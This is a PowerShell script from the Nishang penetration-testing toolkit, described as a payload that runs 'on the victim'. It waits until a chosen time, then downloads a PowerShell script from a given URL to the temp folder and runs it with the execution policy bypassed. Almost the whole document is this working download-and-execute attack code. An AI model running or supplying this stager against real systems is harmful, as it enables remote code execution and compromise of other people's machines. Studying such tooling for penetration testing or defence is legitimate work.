<#
.SYNOPSIS
Nishang Payload which waits till given time to execute a script.

.DESCRIPTION
This payload waits till the given time (on the victim)
and then downloads a PowerShell script and executes it.

.PARAMETER URL
The URL from where the file would be downloaded.

.PARAMETER time
The Time when the payload will be executed (in 24 hour format e.g. 23:21).

.EXAMPLE
PS > Time_Execution http://example.com/script.ps1 hh:mm

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>


Param( [Parameter(Position = 0, Mandatory = $True)] [String] $URL, [Parameter(Position = 1, Mandatory = $True)] [String]$time )
function Time_Execution
{
while(1)
{
start-sleep -seconds 5 
$systime = Get-Date -UFormat %R
#$systime
if ($systime -match $time)
{
"Ïnside if"
$webclient = New-Object System.Net.WebClient 
$file = "$env:temp\time_payload.ps1"
$webclient.DownloadFile($URL,$file) 
powershell.exe -ExecutionPolicy Bypass -noLogo -command $file 
break
}
}
}
Time_Execution